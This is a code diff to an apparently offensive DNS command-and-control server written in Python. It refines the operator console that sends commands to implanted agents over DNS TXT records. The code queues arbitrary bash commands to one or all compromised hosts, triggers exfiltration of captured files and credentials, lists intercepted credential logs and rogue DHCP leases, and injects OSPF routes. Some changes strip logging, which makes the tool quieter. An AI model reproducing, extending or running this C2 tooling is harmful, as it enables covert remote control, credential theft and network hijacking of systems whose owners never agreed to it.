@@ -246,6 +246,46 @@ def _handle_data_chunk(sub: list, src_ip: str) -> bool:
     return True
 
 
+# ── Command numbering & display ───────────────────────────────────────────────
+
+_SHOW_CMDS: dict[int, tuple[str, str]] = {
+    1: ("svis",      "OSPF SVIs & discovered subnets"),
+    2: ("neighbors", "Live OSPF neighbour table"),
+    3: ("lsdb",      "Live LSDB entries"),
+    4: ("leases",    "Active DHCP leases"),
+    5: ("creds",     "Intercepted traffic & credential log"),
+    6: ("status",    "Agent status summary"),
+}
+_SUB_TO_DESC = {sub: desc for sub, desc in _SHOW_CMDS.values()}
+
+
+def _cmd_display(cmd: str) -> str:
+    """Return a human-readable label for a wire command string."""
+    if cmd.startswith("bash:"):
+        return f"bash: {cmd[5:]}"
+    if cmd.startswith("menu:inject:"):
+        return f"inject {cmd[12:]}"
+    if cmd == "menu:exfil":
+        return "exfil"
+    if cmd.startswith("menu:"):
+        return _SUB_TO_DESC.get(cmd[5:], cmd[5:])
+    return cmd
+
+
+def _resolve_agent(token: str) -> str | None:
+    """Resolve a 1-based agent number to its agent_id string."""
+    try:
+        num = int(token)
+        with _agents_lock:
+            keys = list(_agents.keys())
+        if 1 <= num <= len(keys):
+            return keys[num - 1]
+    except ValueError:
+        pass
+    print(f"[!] No agent {token!r} — run 'help' to see current agent numbers.")
+    return None
+
+
 # ── Per-packet request handler ────────────────────────────────────────────────
 
 def _handle(data: bytes, addr: tuple, sock: socket.socket) -> None:
@@ -264,7 +304,6 @@ def _handle(data: bytes, addr: tuple, sock: socket.socket) -> None:
         return
 
     sub = qname.split(".")[:-_DOMAIN_LEN]
-    print(f"[DNS] {src_ip} → {qname}  type={qtype}")
 
     def reply(payload: bytes) -> None:
         try:
@@ -277,24 +316,23 @@ def _handle(data: bytes, addr: tuple, sock: socket.socket) -> None:
         reply(_resp_ns(dns) if qtype == 2 else _resp_soa(dns))
         return
 
-    # command.<domain> — global broadcast command slot
+    # command.<domain> — global broadcast command slot (old-style clients)
     if sub == ["command"]:
         with _cmd_lock:
             cmd = _cmd_state["current"]
-        payload = b"NONE" if cmd == "NONE" else _b32enc(cmd)
-        print(f"[CMD] → {payload.decode()[:80]}")
-        reply(_resp_txt(dns, payload))
+        reply(_resp_txt(dns, b"NONE" if cmd == "NONE" else _b32enc(cmd)))
         return
 
-    # command.<agent_id>.<domain> — per-agent command slot (checked first by dns_c2)
+    # command.<agent_id>.<domain> — per-agent slot; falls back to global broadcast
     if len(sub) == 2 and sub[0] == "command":
         agent_id = sub[1]
         with _cmd_lock:
-            # Pop the per-agent command if one is queued; fall back to broadcast.
             cmd = _agent_cmds.pop(agent_id, None) or _cmd_state["current"]
-        payload = b"NONE" if (not cmd or cmd == "NONE") else _b32enc(cmd)
-        print(f"[CMD-{agent_id}] → {payload.decode()[:80]}")
-        reply(_resp_txt(dns, payload))
+        if cmd and cmd != "NONE":
+            print(f"[CMD] {agent_id} ← {_cmd_display(cmd)}")
+            reply(_resp_txt(dns, _b32enc(cmd)))
+        else:
+            reply(_resp_txt(dns, b"NONE"))
         return
 
     # hello.<agent_id>.<domain> — register or heartbeat
@@ -315,19 +353,15 @@ def _handle(data: bytes, addr: tuple, sock: socket.socket) -> None:
                 f"  IP   : {src_ip}\n"
                 f"  Time : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
             )
-        else:
-            print(f"[HB]  {agent_id} heartbeat from {src_ip}")
         reply(_resp_a(dns))
         return
 
-    # status.<agent_id>.<domain> — respond ACK if agent is registered
+    # status.<agent_id>.<domain> — handshake ACK (silent — only fires during setup)
     if len(sub) == 2 and sub[0] == "status":
         agent_id = sub[1]
         with _agents_lock:
             known = agent_id in _agents
-        txt = b"ACK" if known else b"NONE"
-        print(f"[HS]  {agent_id} → {txt.decode()}")
-        reply(_resp_txt(dns, txt))
+        reply(_resp_txt(dns, b"ACK" if known else b"NONE"))
         return
 
     # Data exfiltration chunks
@@ -368,55 +402,53 @@ def run_server(host: str = "0.0.0.0", port: int = 53) -> None:
 
 # ── Operator console ──────────────────────────────────────────────────────────
 
-_SHOW_SUBS = {"svis", "neighbors", "lsdb", "leases", "creds", "status"}
-
-
 def _queue_agent(agent_id: str, cmd: str, poll_interval: int) -> None:
-    """Store cmd in the per-agent slot and print a delivery hint."""
     with _cmd_lock:
         _agent_cmds[agent_id] = cmd
-    encoded = _b32enc(cmd).decode()
     with _agents_lock:
         known = agent_id in _agents
-    print(f"[*] Queued for {agent_id}: '{cmd}'")
-    print(f"    Encoded (b32) : {encoded}")
-    if not known:
-        print(f"    WARNING: agent {agent_id!r} not yet registered — command held until handshake")
+    label = _cmd_display(cmd)
+    if known:
+        print(f"[+] {agent_id} ← {label}  (within {poll_interval}s)")
     else:
-        print(f"    Delivery      : within {poll_interval}s (next poll cycle)")
+        print(f"[+] {agent_id} ← {label}  (held — agent not yet registered)")
+
+
+def _print_help(poll_interval: int) -> None:
+    now = time.time()
+    with _agents_lock:
+        agent_list = list(_agents.items())
+
+    print()
+    if agent_list:
+        print(f"  {'#':<4s}  {'Agent ID':<14s}  {'IP':<18s}  Last seen")
+        print(f"  {'─'*4}  {'─'*14}  {'─'*18}  {'─'*12}")
+        for i, (aid, info) in enumerate(agent_list, 1):
+            age = int(now - info["last_seen"])
+            print(f"  {i:<4d}  {aid:<14s}  {info['ip']:<18s}  {age}s ago")
+    else:
+        print("  No agents registered yet.")
+
+    print()
+    print(f"  show <agent> <cmd>          poll interval: {poll_interval}s")
+    print(f"  {'─'*40}")
+    for num, (sub, desc) in _SHOW_CMDS.items():
+        print(f"    {num}  {desc}")
+
+    print()
+    print("  bash <agent> <shell_cmd>    targeted shell command")
+    print("  bash <shell_cmd>            broadcast to all agents")
+    print("  inject <agent> <prefix>     inject OSPF stub  (e.g. 10.0.0.0/24)")
+    print("  exfil <agent>               transmit all captured files + creds")
+    print("  clear                       cancel global broadcast command")
+    print("  sessions                    in-progress chunk reassembly")
+    print("  help                        this menu")
+    print("  q                           quit")
+    print()
 
 
 def _console(poll_interval: int = 60) -> None:
-    """
-    Operator console.  Per-agent commands use the targeted slots polled via
-    command.<agent_id>.<domain>; global commands use command.<domain>.
-
-    ── Global (broadcast to every agent) ──────────────────────────────────
-      bash <cmd>                  queue shell command for ALL agents
-      clear                       cancel the global pending command
-      agents                      list registered agents + last-seen age
-      sessions                    list in-progress chunk-reassembly sessions
-      q / quit                    shut down
-
-    ── Per-agent (targeted; use agent ID shown by 'agents') ───────────────
-      show <id> svis              OSPF Hello sources + LSDB subnets
-      show <id> neighbors         live OSPF neighbour table
-      show <id> lsdb              live LSDB entries
-      show <id> leases            active DHCP leases issued by rogue server
-      show <id> creds             intercepted traffic listing + credential log
-      show <id> status            brief agent status summary
-      inject <id> <prefix>        inject OSPF stub route (CIDR or addr/mask)
-      exfil <id>                  transmit all intercepted files + cred log
-      cmd <id> <raw>              send any raw command string to one agent
-    """
-    sep = "─" * 56
-    print(f"\n{sep}")
-    print("  DNS C2 Operator Console")
-    print(f"{sep}")
-    print("  Global : bash <cmd>  |  clear  |  agents  |  sessions  |  q")
-    print("  Target : show <id> <svis|neighbors|lsdb|leases|creds|status>")
-    print("           inject <id> <prefix>  |  exfil <id>  |  cmd <id> <raw>")
-    print(f"{sep}\n")
+    _print_help(poll_interval)
 
     while not _stop_event.is_set():
         try:
@@ -429,39 +461,21 @@ def _console(poll_interval: int = 60) -> None:
         if not line:
             continue
 
-        tokens = line.split(None, 3)   # up to 4 tokens: verb [id] [sub] [extra]
+        tokens = line.split(None, 2)
         verb = tokens[0].lower()
 
-        # ── Shutdown ──────────────────────────────────────────────────────────
         if verb in ("q", "quit"):
             _stop_event.set()
             return
 
-        # ── Global: cancel pending command ────────────────────────────────────
-        if verb == "clear":
+        elif verb == "help":
+            _print_help(poll_interval)
+
+        elif verb == "clear":
             with _cmd_lock:
                 _cmd_state["current"] = "NONE"
-            print("[*] Global command cleared.")
+            print("[*] Global broadcast cleared.")
 
-        # ── Global: list agents ───────────────────────────────────────────────
-        elif verb in ("agents", "list"):
-            with _agents_lock:
-                snap = dict(_agents)
-            if not snap:
-                print("[*] No agents registered yet.")
-            else:
-                now = time.time()
-                print(f"\n  {'ID':<14s}  {'IP':<18s}  {'First seen':<10s}  Last seen")
-                print(f"  {'─'*14}  {'─'*18}  {'─'*10}  {'─'*14}")
-                for aid, info in sorted(snap.items(), key=lambda x: -x[1]["last_seen"]):
-                    age = int(now - info["last_seen"])
-                    first = datetime.datetime.fromtimestamp(
-                        info["first_seen"]
-                    ).strftime("%H:%M:%S")
-                    print(f"  {aid:<14s}  {info['ip']:<18s}  {first:<10s}  {age}s ago")
-                print()
-
-        # ── Global: list in-progress reassembly sessions ──────────────────────
         elif verb == "sessions":
             with _session_lock:
                 snap = {sid: dict(s) for sid, s in _sessions.items()}
@@ -472,45 +486,70 @@ def _console(poll_interval: int = 60) -> None:
                     pct = int(100 * len(s["chunks"]) / max(s["total"], 1))
                     print(f"  {sid}  {len(s['chunks'])}/{s['total']} ({pct}%)  from={s['src_ip']}")
 
-        # ── Global: bash <cmd> — broadcast shell command to all agents ─────────
-        elif verb == "bash" and len(tokens) >= 2:
-            cmd = "bash:" + line[5:].lstrip()   # normalise to bash: prefix
-            with _cmd_lock:
-                _cmd_state["current"] = cmd
-            encoded = _b32enc(cmd).decode()
-            with _agents_lock:
-                n = len(_agents)
-            print(f"[*] Global command  : '{cmd}'")
-            print(f"    Encoded (b32)   : {encoded}")
-            print(f"    Pending agents  : {n} — delivery within {poll_interval}s")
+        elif verb == "show":
+            # show <agent_num> <cmd_num>
+            if len(tokens) < 3:
+                print("[!] Usage: show <agent> <cmd>  (run 'help' for numbers)")
+                continue
+            agent_id = _resolve_agent(tokens[1])
+            if not agent_id:
+                continue
+            try:
+                menu_sub = _SHOW_CMDS[int(tokens[2])][0]
+            except (ValueError, KeyError):
+                print(f"[!] Unknown command {tokens[2]!r}  (run 'help' for numbers)")
+                continue
+            _queue_agent(agent_id, f"menu:{menu_sub}", poll_interval)
 
-        # ── Per-agent: show <id> <sub> ────────────────────────────────────────
-        elif verb == "show" and len(tokens) >= 3:
-            agent_id, sub = tokens[1], tokens[2].lower()
-            if sub not in _SHOW_SUBS:
-                print(f"[!] Unknown show target {sub!r}.  Choose: {', '.join(sorted(_SHOW_SUBS))}")
+        elif verb == "bash":
+            if len(tokens) < 2:
+                print("[!] Usage: bash <agent> <cmd>  or  bash <cmd>")
+                continue
+            # If second token is a number → targeted; otherwise → global broadcast.
+            try:
+                int(tokens[1])
+                is_targeted = True
+            except ValueError:
+                is_targeted = False
+
+            if is_targeted:
+                if len(tokens) < 3:
+                    print("[!] Usage: bash <agent> <shell_cmd>")
+                    continue
+                agent_id = _resolve_agent(tokens[1])
+                if not agent_id:
+                    continue
+                shell_cmd = tokens[2]
+                _queue_agent(agent_id, f"bash:{shell_cmd}", poll_interval)
             else:
-                _queue_agent(agent_id, f"menu:{sub}", poll_interval)
+                shell_cmd = line[5:].lstrip()
+                cmd = f"bash:{shell_cmd}"
+                with _cmd_lock:
+                    _cmd_state["current"] = cmd
+                with _agents_lock:
+                    n = len(_agents)
+                print(f"[+] all ({n}) ← bash: {shell_cmd}  (within {poll_interval}s)")
 
-        # ── Per-agent: inject <id> <prefix> ──────────────────────────────────
-        elif verb == "inject" and len(tokens) >= 3:
-            agent_id, prefix = tokens[1], tokens[2]
-            _queue_agent(agent_id, f"menu:inject:{prefix}", poll_interval)
+        elif verb == "inject":
+            if len(tokens) < 3:
+                print("[!] Usage: inject <agent> <prefix>  (e.g. inject 1 10.0.0.0/24)")
+                continue
+            agent_id = _resolve_agent(tokens[1])
+            if not agent_id:
+                continue
+            _queue_agent(agent_id, f"menu:inject:{tokens[2]}", poll_interval)
 
-        # ── Per-agent: exfil <id> ────────────────────────────────────────────
-        elif verb == "exfil" and len(tokens) >= 2:
-            agent_id = tokens[1]
+        elif verb == "exfil":
+            if len(tokens) < 2:
+                print("[!] Usage: exfil <agent>")
+                continue
+            agent_id = _resolve_agent(tokens[1])
+            if not agent_id:
+                continue
             _queue_agent(agent_id, "menu:exfil", poll_interval)
 
-        # ── Per-agent: cmd <id> <raw> — arbitrary targeted command ───────────
-        elif verb == "cmd" and len(tokens) >= 3:
-            agent_id = tokens[1]
-            raw = line.split(None, 2)[2]   # everything after "cmd <id>"
-            _queue_agent(agent_id, raw, poll_interval)
-
         else:
-            print(f"[!] Unknown command: {line!r}"
-                  "  (type 'agents' for help, 'q' to quit)")
+            print(f"[!] Unknown command {verb!r}  — type 'help'")
 
 
 # ── Entry point ───────────────────────────────────────────────────────────────
